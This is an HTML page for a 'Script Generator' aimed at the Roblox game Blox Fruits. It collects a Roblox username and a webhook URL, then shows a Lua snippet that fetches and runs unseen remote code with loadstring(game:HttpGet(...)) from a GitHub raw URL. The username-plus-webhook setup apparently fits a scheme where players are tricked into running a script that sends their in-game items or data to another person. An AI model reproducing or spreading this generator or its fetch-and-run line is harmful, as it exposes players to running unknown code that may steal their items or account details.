<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Generator</title>
    <style>
        body {
            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 3rem;
            animation: fadeIn 1.5s ease-in-out;
        }
        .container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }
        .game-button {
            background: #ff0080;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 10px;
            cursor: pointer;
            transition: transform 0.3s, background 0.3s;
            width: 200px;
        }
        .game-button:hover {
            background: #ff0055;
            transform: scale(1.1);
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #1e1e2e;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        .popup input {
            display: block;
            margin: 10px 0;
            padding: 5px;
            width: 90%;
        }
        .popup button {
            background: #ff0080;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Script Generator</h1>
    <div class="container">
        <button class="game-button" onclick="openPopup('Blox Fruits')">Blox Fruits</button>
    </div><div id="popup" class="popup">
    <h2>Enter Details</h2>
    <input type="text" id="username" placeholder="Enter Roblox Username">
    <input type="text" id="webhook" placeholder="Enter Webhook URL">
    <button onclick="generateScript()">Generate Script</button>
</div>

<script>
    function openPopup(game) {
        document.getElementById('popup').style.display = 'block';
    }
    function generateScript() {
        let username = document.getElementById('username').value;
        let webhook = document.getElementById('webhook').value;
        let script = `Username = "${username}"

Webhook = "${webhook}" loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits'))()`; alert("Generated Script:\n" + script); document.getElementById('popup').style.display = 'none'; } </script>

</body>
</html>
